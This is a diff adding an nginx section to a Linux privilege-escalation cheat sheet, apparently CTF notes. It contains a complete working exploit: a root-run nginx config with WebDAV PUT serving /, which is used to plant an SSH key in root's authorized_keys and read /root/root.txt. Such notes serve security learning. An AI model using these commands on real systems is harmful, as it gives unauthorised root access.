@@ -278,6 +278,40 @@ ln -s /root/root.txt root.txt
 ```
 > - [Wildcards Spare tricks - HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#id-7z)
 
+## Nginx
+
+### Sudo/SUID Permissions on `nginx`
+```bash
+# 1. Create the malicious Nginx configuration file
+cat << EOF > /tmp/pwn.conf
+user root;
+worker_processes 4;
+pid /tmp/nginx.pid;
+events {
+    worker_connections 768;
+}
+http {
+	server {
+	    listen 55555;
+	    root /;
+	    autoindex on;
+	    dav_methods PUT;
+	}
+}
+EOF
+
+# 2. Run nginx with the malicious configuration
+sudo nginx -c /tmp/pwn.conf
+
+# 3. Put SSH key in /root/.ssh/authorized_keys
+ssh-keygen -t rsa -f /tmp/id_rsa -N ""
+curl -X PUT localhost:55555/root/.ssh/authorized_keys -d "$(cat /tmp/id_rsa.pub)"
+
+# 3'. Get the root flag directly
+curl http://localhost:55555/root/root.txt
+```
+> - https://github.com/DylanGrl/nginx_sudo_privesc?tab=readme-ov-file
+
 ## Sudo
 
 ### Sudo Version
